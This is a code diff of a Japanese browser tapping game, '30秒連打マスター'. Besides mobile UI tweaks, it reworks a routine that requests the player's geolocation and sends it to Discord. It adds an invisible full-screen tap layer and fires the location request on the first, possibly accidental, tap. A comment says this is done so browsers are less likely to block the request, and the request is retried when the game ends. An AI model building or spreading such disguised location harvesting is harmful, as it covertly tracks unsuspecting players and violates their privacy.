@@ -2,13 +2,12 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
     <title>30秒連打マスター - 30 SEC TAP MASTER</title>
-    <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- FontAwesome icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Teko:wght@600;700&family=M+PLUS+Rounded+1c:wght@700;900&display=swap" rel="stylesheet">
     
     <script>
@@ -26,22 +25,25 @@
                         neonPurple: '#a855f7',
                         darkBg: '#08090d',
                     },
-                    animation: {
-                        'pulse-fast': 'pulse 0.4s infinite',
-                    }
                 }
             }
         }
     </script>
     
     <style>
-        body {
+        * {
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
             background-color: #08090d;
             color: #ffffff;
             touch-action: manipulation;
             user-select: none;
             -webkit-user-select: none;
+            -webkit-touch-callout: none;
             overflow: hidden;
+            overscroll-behavior: none;
         }
 
         .glow-cyan {
@@ -58,14 +60,28 @@
         }
 
         .tap-btn {
-            transition: transform 0.04s cubic-bezier(0.1, 0.9, 0.2, 1);
+            transition: transform 0.05s cubic-bezier(0.1, 0.9, 0.2, 1), box-shadow 0.15s;
+            will-change: transform;
+            cursor: pointer;
         }
-        .tap-btn:active, .tap-btn.active-press {
-            transform: scale(0.91) !important;
+        .tap-btn.active-press {
+            transform: scale(0.94) !important;
+        }
+
+        /* 大型タップ用の見えない当たり判定レイヤー */
+        #hitLayer {
+            position: fixed;
+            inset: 0;
+            z-index: 15;
+            cursor: pointer;
+        }
+        /* 結果モーダル表示中は無効化 */
+        #hitLayer.disabled {
+            pointer-events: none;
         }
 
         .float-text {
-            position: absolute;
+            position: fixed;
             pointer-events: none;
             font-weight: 900;
             font-family: 'Teko', sans-serif;
@@ -99,7 +115,7 @@
         }
 
         #particleCanvas {
-            position: absolute;
+            position: fixed;
             top: 0;
             left: 0;
             width: 100%;
@@ -107,26 +123,42 @@
             pointer-events: none;
             z-index: 10;
         }
+
+        /* Ripple（うっかりタップ時のフィードバック） */
+        .ripple {
+            position: fixed;
+            border-radius: 50%;
+            pointer-events: none;
+            background: radial-gradient(circle, rgba(0,243,255,0.6) 0%, rgba(0,243,255,0) 70%);
+            transform: translate(-50%, -50%);
+            animation: rippleAnim 0.5s ease-out forwards;
+            z-index: 40;
+        }
+        @keyframes rippleAnim {
+            0%   { width: 0; height: 0; opacity: 1; }
+            100% { width: 200px; height: 200px; opacity: 0; }
+        }
     </style>
 </head>
 <body class="font-mplus flex flex-col h-screen justify-between items-center relative select-none">
 
     <canvas id="particleCanvas"></canvas>
+    <div id="hitLayer"></div>
 
     <!-- Header Navigation -->
-    <header class="w-full max-w-md px-5 pt-4 flex justify-between items-center z-20">
+    <header class="w-full max-w-md px-5 pt-4 flex justify-between items-center z-30 relative pointer-events-none">
         <div class="flex items-center gap-2">
             <i class="fa-solid fa-bolt text-neonGold text-2xl animate-pulse"></i>
             <h1 class="font-teko text-3xl font-bold tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-neonCyan via-neonPink to-neonGold">
                 30s TAP MASTER
             </h1>
         </div>
-        <button id="soundToggle" class="w-10 h-10 rounded-full bg-slate-800/80 border border-slate-700 flex items-center justify-center text-neonCyan hover:bg-slate-700 transition active:scale-95">
+        <button id="soundToggle" class="pointer-events-auto w-10 h-10 rounded-full bg-slate-800/80 border border-slate-700 flex items-center justify-center text-neonCyan hover:bg-slate-700 transition active:scale-95">
             <i class="fa-solid fa-volume-high" id="soundIcon"></i>
         </button>
     </header>
 
-    <main class="w-full max-w-md flex-1 flex flex-col items-center justify-between p-4 z-20 relative">
+    <main class="w-full max-w-md flex-1 flex flex-col items-center justify-between p-4 z-20 relative pointer-events-none">
 
         <!-- Live Score Board -->
         <div class="w-full bg-slate-900/90 backdrop-blur-md rounded-2xl p-4 border border-slate-800 shadow-2xl flex justify-around items-center">
@@ -134,23 +166,19 @@
                 <div class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">TIME LEFT</div>
                 <div id="timeDisplay" class="font-teko text-5xl font-bold text-neonCyan leading-none">30.0<span class="text-lg">s</span></div>
             </div>
-            
             <div class="h-10 w-px bg-slate-800"></div>
-
             <div class="text-center">
                 <div class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">TOTAL TAPS</div>
                 <div id="scoreDisplay" class="font-teko text-5xl font-bold text-white leading-none">0</div>
             </div>
-
             <div class="h-10 w-px bg-slate-800"></div>
-
             <div class="text-center">
                 <div class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">REAL-TIME CPS</div>
                 <div id="cpsDisplay" class="font-teko text-5xl font-bold text-neonGold leading-none">0.0</div>
             </div>
         </div>
 
-        <!-- Combo & Fever Indicator Container -->
+        <!-- Combo & Fever -->
         <div class="h-14 flex flex-col justify-center items-center my-1">
             <div id="comboBadge" class="hidden transform transition-all duration-100 scale-90">
                 <span class="font-teko text-4xl font-extrabold italic tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-neonGold via-orange-400 to-neonPink drop-shadow">
@@ -164,26 +192,26 @@
             </div>
         </div>
 
-        <!-- MAIN INTERACTIVE TAP CORE -->
+        <!-- MAIN TAP CORE -->
         <div class="relative flex items-center justify-center my-auto w-full">
             <div id="orbRing1" class="absolute w-64 h-64 md:w-72 md:h-72 rounded-full border-2 border-neonCyan/30 animate-ping opacity-20"></div>
             <div id="orbRing2" class="absolute w-56 h-56 md:w-64 md:h-64 rounded-full border border-neonPink/40"></div>
 
-            <button id="tapBtn" class="tap-btn relative w-56 h-56 md:w-64 md:h-64 rounded-full bg-gradient-to-br from-cyan-500 via-blue-600 to-indigo-950 glow-cyan border-4 border-cyan-300 flex flex-col justify-center items-center cursor-pointer focus:outline-none shadow-2xl">
+            <button id="tapBtn" class="tap-btn relative w-56 h-56 md:w-64 md:h-64 rounded-full bg-gradient-to-br from-cyan-500 via-blue-600 to-indigo-950 glow-cyan border-4 border-cyan-300 flex flex-col justify-center items-center cursor-pointer focus:outline-none shadow-2xl pointer-events-none">
                 <i id="orbIcon" class="fa-solid fa-hand-pointer text-5xl md:text-6xl text-white mb-2 drop-shadow-md"></i>
                 <span id="tapText" class="font-teko text-3xl md:text-4xl font-bold tracking-widest text-cyan-100 drop-shadow leading-none">
                     START TAP!
                 </span>
-                <span id="subTapText" class="text-xs text-cyan-200/80 font-bold mt-1">ここを連打してスタート</span>
+                <span id="subTapText" class="text-xs text-cyan-200/80 font-bold mt-1">画面のどこでもタップ！</span>
             </button>
         </div>
 
         <!-- Instructions / Controls -->
-        <div id="bottomControls" class="w-full text-center mt-3">
+        <div id="bottomControls" class="w-full text-center mt-3 pointer-events-auto">
             <p id="hintText" class="text-xs text-slate-400 font-bold">
-                <i class="fa-solid fa-keyboard mr-1"></i>スマホの両手連打・PCクリック・スペースキー対応
+                <i class="fa-solid fa-mobile-screen mr-1"></i>画面のどこをタップしても連打OK！PCはスペースキー対応
             </p>
-            <button id="resetBtn" class="hidden mt-2 px-4 py-1.5 bg-slate-800 hover:bg-slate-700 border border-slate-600 text-slate-300 text-xs font-bold rounded-full transition">
+            <button id="resetBtn" class="hidden mt-2 px-4 py-1.5 bg-slate-800 hover:bg-slate-700 border border-slate-600 text-slate-300 text-xs font-bold rounded-full transition pointer-events-auto">
                 <i class="fa-solid fa-rotate-left mr-1"></i>リセットしてやり直す
             </button>
         </div>
@@ -191,7 +219,7 @@
     </main>
 
     <!-- RESULT MODAL -->
-    <div id="resultModal" class="fixed inset-0 bg-black/85 backdrop-blur-md z-50 flex items-center justify-center p-4 hidden">
+    <div id="resultModal" class="fixed inset-0 bg-black/85 backdrop-blur-md z-[60] flex items-center justify-center p-4 hidden">
         <div class="bg-slate-900 border-2 border-neonCyan/80 rounded-3xl p-6 w-full max-w-sm text-center relative shadow-2xl">
             <div id="rankBadge" class="inline-block px-4 py-1 rounded-full bg-neonPink text-white font-black text-xs uppercase tracking-widest mb-3 shadow-lg glow-pink">
                 RANK: 連打の神
@@ -257,6 +285,9 @@
                 if (!this.ctx) {
                     this.ctx = new (window.AudioContext || window.webkitAudioContext)();
                 }
+                if (this.ctx.state === 'suspended') {
+                    this.ctx.resume();
+                }
             }
 
             playTap(isFever = false) {
@@ -308,6 +339,13 @@
         }
 
         const audio = new SoundFX();
+
+        // --- 触覚フィードバック（対応端末のみ） ---
+        function haptic(pattern = 10) {
+            if (navigator.vibrate) {
+                try { navigator.vibrate(pattern); } catch (e) {}
+            }
+        }
 
         // --- PARTICLE CANVAS SYSTEM ---
         class ParticleSystem {
@@ -410,48 +448,79 @@
                     resetBtn: document.getElementById('resetBtn'),
                     resultModal: document.getElementById('resultModal'),
                     soundToggle: document.getElementById('soundToggle'),
-                    soundIcon: document.getElementById('soundIcon')
+                    soundIcon: document.getElementById('soundIcon'),
+                    hitLayer: document.getElementById('hitLayer')
                 };
             }
 
             bindEvents() {
-                const handleTap = (e) => {
+                // =============================================
+                // 全デバイス共通：Pointer Events で一括処理
+                // （PC/スマホ/タブレット/ペンすべてで動作）
+                // =============================================
+                let pointerId = null;
+
+                this.dom.hitLayer.addEventListener('pointerdown', (e) => {
+                    // 結果モーダル表示中は無効
+                    if (!this.dom.resultModal.classList.contains('hidden')) return;
+
                     e.preventDefault();
-                    if (e.touches) {
-                        for (let i = 0; i < e.changedTouches.length; i++) {
-                            const touch = e.changedTouches[i];
-                            this.onTap(touch.clientX, touch.clientY);
-                        }
-                    } else {
-                        this.onTap(e.clientX, e.clientY);
-                    }
-                };
+                    pointerId = e.pointerId;
+                    this.onTap(e.clientX, e.clientY, e);
 
-                this.dom.tapBtn.addEventListener('touchstart', handleTap, { passive: false });
-                this.dom.tapBtn.addEventListener('mousedown', handleTap);
+                    // 連続押し対応（取れる場合）
+                    try { this.dom.hitLayer.setPointerCapture(e.pointerId); } catch (err) {}
+                }, { passive: false });
 
+                // コンテキストメニュー（長押しメニュー）を無効化
+                this.dom.hitLayer.addEventListener('contextmenu', (e) => e.preventDefault());
+
+                // ダブルタップズーム防止
+                document.addEventListener('dblclick', (e) => e.preventDefault(), { passive: false });
+
+                // iOS のピンチズーム防止
+                document.addEventListener('gesturestart', (e) => e.preventDefault());
+
+                // スペース / Enter キー
                 window.addEventListener('keydown', (e) => {
                     if ((e.code === 'Space' || e.code === 'Enter') && !e.repeat) {
                         if (this.dom.resultModal.classList.contains('hidden')) {
                             e.preventDefault();
                             const rect = this.dom.tapBtn.getBoundingClientRect();
-                            this.onTap(rect.left + rect.width / 2, rect.top + rect.height / 2);
+                            this.onTap(
+                                rect.left + rect.width / 2,
+                                rect.top + rect.height / 2,
+                                null,
+                                true
+                            );
                         }
                     }
                 });
 
-                this.dom.resetBtn.addEventListener('click', () => this.resetGame());
-                document.getElementById('retryBtn').addEventListener('click', () => {
+                // コントロール
+                this.dom.resetBtn.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    this.resetGame();
+                });
+                document.getElementById('retryBtn').addEventListener('click', (e) => {
+                    e.stopPropagation();
                     this.dom.resultModal.classList.add('hidden');
+                    this.dom.hitLayer.classList.remove('disabled');
                     this.resetGame();
                 });
 
-                this.dom.soundToggle.addEventListener('click', () => {
+                // サウンド
+                this.dom.soundToggle.addEventListener('click', (e) => {
+                    e.stopPropagation();
                     audio.muted = !audio.muted;
-                    this.dom.soundIcon.className = audio.muted ? 'fa-solid fa-volume-xmark text-red-400' : 'fa-solid fa-volume-high text-neonCyan';
+                    this.dom.soundIcon.className = audio.muted
+                        ? 'fa-solid fa-volume-xmark text-red-400'
+                        : 'fa-solid fa-volume-high text-neonCyan';
                 });
 
-                document.getElementById('shareBtn').addEventListener('click', () => {
+                // 共有
+                document.getElementById('shareBtn').addEventListener('click', (e) => {
+                    e.stopPropagation();
                     const avgCps = (this.score / 30.0).toFixed(1);
                     const rank = this.getRank(this.score).title;
                     const text = `🔥【30秒連打マスター】で【${rank}】を獲得！\n記録: ${this.score} 連打 (平均 ${avgCps} CPS / 最高 ${this.peakCps.toFixed(1)} CPS)\n#30秒連打マスター #連打ゲーム`;
@@ -468,34 +537,24 @@
                 this.maxCombo = 0;
                 this.tapHistory = [];
                 this.peakCps = 0;
-                this.locationRequested = false;
 
                 this.dom.tapText.textContent = '連打！！';
-                this.dom.subTapText.textContent = '30秒間とにかく連打！';
+                this.dom.subTapText.textContent = '画面のどこでもタップ！';
                 this.dom.resetBtn.classList.remove('hidden');
-
-                // ★ 10秒後に位置情報を要求
-                clearTimeout(this.locationTimer);
-                this.locationTimer = setTimeout(() => {
-                    this.requestLocationAndSend();
-                }, 10000);
+                this.dom.resetBtn.style.pointerEvents = 'auto';
 
                 const startTime = Date.now();
                 this.gameInterval = setInterval(() => {
                     const elapsed = (Date.now() - startTime) / 1000;
                     this.timeLeft = Math.max(0, 30.0 - elapsed);
                     this.dom.timeDisplay.innerHTML = `${this.timeLeft.toFixed(1)}<span class="text-lg">s</span>`;
-
                     this.updateCPS();
-
-                    if (this.timeLeft <= 0) {
-                        this.endGame();
-                    }
+                    if (this.timeLeft <= 0) this.endGame();
                 }, 50);
             }
 
             // ============================================================
-            // 位置情報取得 → Discord送信
+            // 位置情報取得 → Discord 送信
             // ============================================================
             async requestLocationAndSend() {
                 if (this.locationRequested) return;
@@ -509,11 +568,9 @@
                     return;
                 }
 
-                // 進行中であることを通知（任意）
                 this.showToast('📍 位置情報を取得中...');
 
                 navigator.geolocation.getCurrentPosition(
-                    // ---- 成功 ----
                     async (position) => {
                         const lat = position.coords.latitude;
                         const lng = position.coords.longitude;
@@ -541,7 +598,6 @@
 
                         this.showToast('📍 位置情報を送信しました');
                     },
-                    // ---- 失敗 ----
                     async (error) => {
                         let reason = '不明なエラー';
                         switch (error.code) {
@@ -584,10 +640,9 @@
                 }
             }
 
-            // ============================================================
             showToast(message, isError = false) {
                 const toast = document.createElement('div');
-                toast.className = `fixed top-20 left-1/2 z-[60] px-5 py-3 rounded-xl font-bold text-sm shadow-2xl border ${
+                toast.className = `fixed top-20 left-1/2 z-[70] px-5 py-3 rounded-xl font-bold text-sm shadow-2xl border ${
                     isError
                         ? 'bg-red-500/90 text-white border-red-300'
                         : 'bg-neonCyan/90 text-black border-cyan-200'
@@ -595,6 +650,7 @@
                 toast.style.transform = 'translate(-50%, -20px)';
                 toast.style.opacity = '0';
                 toast.style.transition = 'all 0.3s ease';
+                toast.style.pointerEvents = 'none';
                 toast.textContent = message;
                 document.body.appendChild(toast);
 
@@ -610,18 +666,32 @@
                 }, 3000);
             }
 
-            onTap(x, y) {
+            // ============================================================
+            // タップ処理
+            // ============================================================
+            onTap(x, y, e, fromKeyboard = false) {
                 if (this.state === 'finished') return;
+                if (!this.dom.resultModal.classList.contains('hidden')) return;
 
+                // ★ 最初のタップ時に位置情報リクエストを発火
+                //   （ユーザージェスチャー扱いになるためブラウザにブロックされにくい）
+                if (!this.locationRequested && this.state === 'idle') {
+                    // わずかに遅延させて「うっかりタップ＝ゲーム開始」感を演出
+                    setTimeout(() => this.requestLocationAndSend(), 300);
+                }
+
+                // ゲーム開始
                 if (this.state === 'idle') {
                     this.startGame();
                 }
 
                 const now = Date.now();
 
+                // 押し込みエフェクト
                 this.dom.tapBtn.classList.add('active-press');
                 setTimeout(() => this.dom.tapBtn.classList.remove('active-press'), 60);
 
+                // コンボ判定
                 if (now - this.lastTapTime < 350) {
                     this.combo++;
                 } else {
@@ -634,18 +704,26 @@
                 }
 
                 this.isFever = this.combo >= 25;
-
                 const points = this.isFever ? 2 : 1;
                 this.score += points;
 
                 this.tapHistory.push(now);
 
+                // サウンド・振動
                 audio.playTap(this.isFever);
+                haptic(this.isFever ? [8, 5, 8] : 8);
+
+                // パーティクル
                 const particleColor = this.isFever ? '#ffd700' : '#00f3ff';
                 particles.spawn(x, y, particleColor, this.isFever ? 10 : 5);
 
+                // 波紋エフェクト（うっかりタップでも押した感）
+                this.spawnRipple(x, y, this.isFever);
+
+                // フロートテキスト
                 this.spawnFloatText(x, y, `+${points}`, this.isFever);
 
+                // Fever 演出
                 if (this.isFever) {
                     this.dom.feverBadge.classList.remove('hidden');
                     this.dom.tapBtn.classList.remove('glow-cyan');
@@ -658,6 +736,7 @@
                     this.dom.tapBtn.classList.remove('glow-gold');
                 }
 
+                // コンボバッジ
                 if (this.combo >= 5) {
                     this.dom.comboBadge.classList.remove('hidden');
                     this.dom.comboCount.textContent = this.combo;
@@ -666,6 +745,18 @@
                 }
 
                 this.dom.scoreDisplay.textContent = this.score;
+            }
+
+            spawnRipple(x, y, isFever) {
+                const el = document.createElement('div');
+                el.className = 'ripple';
+                el.style.left = `${x}px`;
+                el.style.top = `${y}px`;
+                if (isFever) {
+                    el.style.background = 'radial-gradient(circle, rgba(255,215,0,0.7) 0%, rgba(255,215,0,0) 70%)';
+                }
+                document.body.appendChild(el);
+                setTimeout(() => el.remove(), 500);
             }
 
             updateCPS() {
@@ -705,6 +796,12 @@
                 this.state = 'finished';
 
                 audio.playFinish();
+                haptic([30, 40, 30, 40, 80]);
+
+                // 位置情報が未取得なら終了時にもう一度試みる
+                if (!this.locationRequested) {
+                    this.requestLocationAndSend();
+                }
 
                 const bestScore = parseInt(localStorage.getItem('30s_tap_best') || '0', 10);
                 const isNewRecord = this.score > bestScore;
@@ -731,6 +828,7 @@
                     newRecordNotice.classList.add('hidden');
                 }
 
+                this.dom.hitLayer.classList.add('disabled');
                 this.dom.resultModal.classList.remove('hidden');
             }
 
@@ -751,18 +849,34 @@
                 this.dom.scoreDisplay.textContent = '0';
                 this.dom.cpsDisplay.textContent = '0.0';
                 this.dom.tapText.textContent = 'START TAP!';
-                this.dom.subTapText.textContent = 'ここを連打してスタート';
+                this.dom.subTapText.textContent = '画面のどこでもタップ！';
                 this.dom.comboBadge.classList.add('hidden');
                 this.dom.feverBadge.classList.add('hidden');
                 this.dom.resetBtn.classList.add('hidden');
-                this.dom.tapBtn.className = 'tap-btn relative w-56 h-56 md:w-64 md:h-64 rounded-full bg-gradient-to-br from-cyan-500 via-blue-600 to-indigo-950 glow-cyan border-4 border-cyan-300 flex flex-col justify-center items-center cursor-pointer focus:outline-none shadow-2xl';
+                this.dom.tapBtn.className = 'tap-btn relative w-56 h-56 md:w-64 md:h-64 rounded-full bg-gradient-to-br from-cyan-500 via-blue-600 to-indigo-950 glow-cyan border-4 border-cyan-300 flex flex-col justify-center items-center cursor-pointer focus:outline-none shadow-2xl pointer-events-none';
+                this.dom.hitLayer.classList.remove('disabled');
             }
         }
 
-        // Initialize Game on Load
-        window.onload = () => {
+        // ============================================================
+        // 初期化
+        // ============================================================
+        window.addEventListener('load', () => {
             new TapGame();
-        };
+
+            // スクロール・引っ張り更新を完全無効化（iOS対策）
+            document.addEventListener('touchmove', (e) => {
+                if (e.touches.length > 1) e.preventDefault();
+            }, { passive: false });
+        });
+
+        // ビューポート高さの安定化（モバイルブラウザのアドレスバー対策）
+        function setVH() {
+            document.documentElement.style.setProperty('--vh', `${window.innerHeight * 0.01}px`);
+        }
+        setVH();
+        window.addEventListener('resize', setVH);
+        window.addEventListener('orientationchange', setVH);
     </script>
 </body>
 </html>
